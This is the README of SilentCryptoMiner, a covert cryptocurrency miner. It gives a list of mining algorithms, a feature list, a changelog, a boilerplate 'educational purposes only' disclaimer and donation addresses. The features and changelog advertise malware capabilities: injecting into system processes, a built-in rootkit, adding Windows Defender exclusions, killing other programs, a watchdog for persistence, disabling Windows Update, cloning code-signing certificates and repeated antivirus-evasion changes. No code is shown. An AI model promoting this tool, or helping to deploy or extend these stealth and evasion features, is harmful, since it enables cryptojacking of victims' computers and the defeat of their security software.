<img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true">

# SilentCryptoMiner v3.3.1 - Miner for ETC, RVN, XMR, RTM & many more

A free silent (hidden) native cryptocurrency miner capable of mining ETC, RVN, XMR, RTM and much more, with many features suited for mining silently.

This miner can mine all the following algorithms and thus any cryptocurrency that uses one of them:
<details>
 <summary>List of algorithms</summary>
 <table>
	<tr><th>Algorithm</th><th>Example Cryptocurrency</th></tr>
	<tr><td>rx/0</td><td>Monero</td></tr>
	<tr><td>gr</td><td>Raptoreum</td></tr>
	<tr><td>ethash</td><td>EthereumPoW, Metaverse, Callisto, QuarkChain, EtherGem, Etho, Expanse, Ellaism</td></tr>
	<tr><td>etchash</td><td>Ethereum Classic</td></tr>
	<tr><td>ubqhash</td><td>Ubiq</td></tr>
	<tr><td>kawpow</td><td>Ravencoin, Neoxa, Meowcoin</td></tr>
	<tr><td>firopow</td><td>Firo, Kiirocoin</td></tr>
	<tr><td>progpow</td><td>Sero</td></tr>
	<tr><td>progpowz</td><td>Zano</td></tr>
	<tr><td>evrprogpow</td><td>Evrmore</td></tr>
	<tr><td>cn/gpu</td><td>Conceal, Ryo, Equilibria</td></tr>
	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
	<tr><td>rx/arq</td><td>ArQmA</td></tr>
	<tr><td>cn-heavy/xhv</td><td>Haven, Blockcloud</td></tr>
	<tr><td>cn/fast</td><td>Electronero, ElectroneroXP</td></tr>
	<tr><td>rx/keva</td><td>Kevacoin</td></tr>
	<tr><td>cn-pico</td><td>Kryptokrona</td></tr>
	<tr><td>cn/half</td><td>Masari</td></tr>
	<tr><td>argon2/ninja</td><td>NinjaCoin</td></tr>
	<tr><td>rx/sfx</td><td>Safex</td></tr>
	<tr><td>cn/r</td><td>Sumokoin</td></tr>
	<tr><td>cn-pico/tlo</td><td>Talleo</td></tr>
	<tr><td>argon2/chukwav2</td><td>Turtlecoin</td></tr>
	<tr><td>cn/upx2</td><td>Uplexa</td></tr>
	<tr><td>rx/wow</td><td>Wownero</td></tr>
	<tr><td>cn/ccx</td><td></td></tr>
	<tr><td>cn/zls</td><td></td></tr>
	<tr><td>cn/double</td><td></td></tr>
	<tr><td>cn/2</td><td></td></tr>
	<tr><td>cn/xao</td><td></td></tr>
	<tr><td>cn/rwz</td><td></td></tr>
	<tr><td>cn/rto</td><td></td></tr>
	<tr><td>cn-heavy/tube</td><td></td></tr>
	<tr><td>cn-heavy/0</td><td></td></tr>
	<tr><td>cn/1</td><td></td></tr>
	<tr><td>cn-lite/1</td><td></td></tr>
	<tr><td>cn-lite/0</td><td></td></tr>
	<tr><td>cn/0</td><td></td></tr>
</table>
</details>

## Main Features

* Native C++ - Miner installer/injector and watchdog coded fully in C++ with no run requirements except a 64-bit OS
* Injection (Silent/Hidden) - Hide miner inside another process like explorer.exe, conhost.exe, svchost.exe and others
* Idle Mining - Can be configured to mine at different CPU and GPU usages or not at all while computer is or isn't in use
* Stealth - Pauses the miner and clears the GPU memory and RAM while any of the programs in the "Stealth Targets" option are open
* Watchdog - Monitors the miner file, miner processes and startup entry and restores the miner if anything is removed or killed
* Multiple Miners - Can create multiple miners to run at the same time, for example one XMR (CPU) miner and one RVN (GPU) miner
* CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
* Windows Defender Exclusions - Can add exclusions into Windows Defender after being started to avoid being detected
* Process Killer - Constantly checks for any programs in the "Kill Targets" list and kills them if found
* Remote Configuration - Can get the miner settings remotely from a specified URL every 100 minutes
* Web Panel Support - Has support for monitoring and configuring all the miners efficiently in a free self-hosted online web panel
* Rootkit - Has a built-in rootkit that can be enabled to fully hide the miner processes
* And many many more.

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentCryptoMiner/releases

Example Settings: [Example Settings](https://github.com/UnamSanctam/SilentCryptoMiner/wiki#example-settings)

## Wiki

You can find the wiki [here](https://github.com/UnamSanctam/SilentCryptoMiner/wiki) or at the top of the page. The wiki contains information about the miner and all of its features, it also has some answers to frequently asked questions.

## Web Panel

You can find the web panel that the miner officially supports here: [UnamWebPanel](https://github.com/UnamSanctam/UnamWebPanel). The web panel can be used to monitor your miners hashrate, status, connection settings and more. It can also be used to change the miner settings just like how the option "Remote Configuration" does it.

## Changelog

### 3.3.1 (04/09/2023)
* Added OpenCL ICD loader statically into the GPU miner because some systems local loaders do not seem to work
* Added automatic CPU mining core restart when a prolonged period of zero hashrate is detected
* Fixed administrator "Startup" trigger to be "on login" when "Run as System" is disabled
* Reduced some antivirus detections by modifying the miner compilation command
* Changed some miner builder compiler commands to be absolute instead of relative
* Added "Assembly" tab "Version" number sanitization
* Fixed unnecessary log warning during compilation
* Removed many old unused debug strings inside the miners
### 3.3.0 (24/08/2023)
* Added the KawPow (kawpow) algorithm directly into the GPU miner
* Added new FiroPow (firopow) algorithm
* Added new ProgPow (progpow) algorithm
* Added new ProgPowZ (progpowz) algorithm
* Added new EvrProgPow (evrprogpow) algorithm
* Implemented KawPow, FiroPow, EvrProgPow, ProgPow and ProgPowZ using only OpenCL for both Nvidia and AMD to bypass large CUDA NVRTC library requirement
* Rewrote most of the GPU miner to add support for multiple algorithm families and to greatly improve stability and reliability
* Added Sero-Proxy protocol to be able to mine Sero (ProgPow)
* Removed KawPow (kawpow) algorithm from the XMR miner and also the large CUDA NVRTC library to make sure no one accidentally uses it
* Re-added the Panthera (rx/xla) algorithm
* Added Zephyr coin (rx/0) solo mining support
* Moved the XMR miner "GPU Mining" option into the "Advanced" tab to discourage unprofitable XMR GPU mining
* Moved the "Use Rootkit" option into the "Advanced Options" for better clarity regarding its complexity
* Changed Task Scheduler Task creation from Powershell to only using the command line with a temporary XML file
* Changed MSR driver path from using a static library path to a dynamically generated path
* Modified embedded file encryption and decryption to reduce heuristic detections
* Changed the code compiler build to different one to greatly reduce the compiler-caused antivirus detections
* Improved the external compiler execution commands by better forcing absolute paths in commands
* Added a mutex into the miner installer/injector to make it checkable by the watchdog
* Reduced the watchdog checking interval for better persistance
* Removed unused helper functions
* Rewrote uninstallers miner killer function to work with Process IDs above the ushort limit
* Changed unicode string initialization from a macro to a function to reduce the final code size
* Changed string formatting from using the built-in Windows API to instead use a much smaller custom function
* Moved web panel reporting to happen before CPU idle usage change in order to help make the hashrate look less confusing
* Improved RandomX database regeneration speed when leaving "Stealth" on pools with infrequent new jobs
* Fixed weird default "Stealth on Fullscreen" configuration value when "Run as System" was disabled
* Fixed possible null terminator string length counting problem inside the GPU checking function
* Reduced unnecessary recursive directory creation function stack size
* Changed miners execution state to no longer always semi-block sleep mode on some computers
* Restructured the algorithm selection list to be easier to use
* Added semi-CLI functionality for building miners through the command line
* Updated the rootkit to a new version
### 3.2.0 (01/04/2023)
* Changed miner settings from being passed through the command line to instead be passed directly through the PEB
* Changed XMR miner to clear RAM during "Stealth" when possible
* Changed PEB calls to be more obfuscated due to new detections
* Changed miner to read the current executable path for installation directly from the PEB instead of a Windows API call
* Changed miner and watchdog to read the environmental variables directly by traversing the PEB
* Included rootkit directly inside the miner instead of using the rootkit installer to avoid the new AMSI detections and for more flexibility
* Changed rootkit to now run outside of the "Startup" installation flow to allow for it to run when "Startup" is disabled
* Moved "Install Rootkit" out from "Advanced Options" and renamed it to "Use Rootkit (Hide Miner)" since the rootkit should now be stable
* Updated compiler command options to reduce detections
* Added system call registry access functions to allow registry manipulation without using the Windows API or CMD
* Changed GPU checking to directly read the registry instead of using a WMI command with a file buffer
* Added signature cloning tab where you can clone the digital certificate of another program into the miner
* Moved administrator checks from powershell directly into the C++ code
* Added Task Scheduler "Startup" entry checking into the Watchdog
* Merged obfuscate.h library and obfuscatew.h library into a custom-made unified version called obfuscateu.h
* Added a custom-made SysWhispersU direct system call generator and removed the previous SysWhispers2
* Modified SysWhispersU and obfuscateu.h to use different encryptions in order to avoid XOR detections
* Added simple obfuscation to well-known SysWhispers constants and offsets to avoid static detections
* Readded explorer.exe as injection option
* Made explorer.exe the default injection option again
* Updated uninstaller to instead find the watchdog and miner processes by enumerating system mutex handles to find the owner process
* Added "Disable Windows Update" rollback into the uninstaller to allow the uninstaller to fix Windows Update during uninstallation
* Updated checker to instead check if the mutex is active to ascertain whether the miner and watchdog is running or not
* Merged many C++ files together to be able to store them unzipped in the project in order to make all code changes directly visible in commits
* Optimized and shortened many functions such as the previously verbose process creation function
* Increased delete pending injection temporary file name length to further decrease collision chance
* Fixed possible parent spoofing failure if required buffer size changes between system calls
* Change installation to call reg.exe and schtasks.exe directly when possible instead of through cmd.exe
* Fixed "Startup" installation bug on some systems when "Entry Name" contained a space
* Fixed support for Unicode characters inside the "Assembly" settings
* Updated both miners
* Added Portuguese (Brazil) translation (MatheusOliveira-dev)

[You can view the full Changelog here](CHANGELOG.md)

## Author

* **Unam Sanctam**

## Contributors

* **[Werlrlivx](https://github.com/Werlrlivx)** - Polish Translation
* **[Xeneht](https://github.com/Xeneht)** - Spanish Translation
* **[BITIW](https://github.com/BITIW)** - Russian Translation
* **[MatheusOliveira-dev](https://github.com/MatheusOliveira-dev)** - Portuguese (Brazil) Translation

## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1q26uwkzv6rgsxqnlapkj908l68vl0j753r46wvq

ETH: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

ETC: 0xd513e80ECc106A1BA7Fa15F1C590Ef3c4cd16CF3

RVN: RFsUdiQJ31Zr1pKZmJ3fXqH6Gomtjd2cQe

LINK: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

DOGE: DNgFYHnZBVLw9FMdRYTQ7vD4X9w3AsWFRv

LTC: Lbr8RLB7wSaDSQtg8VEgfdqKoxqPq5Lkn3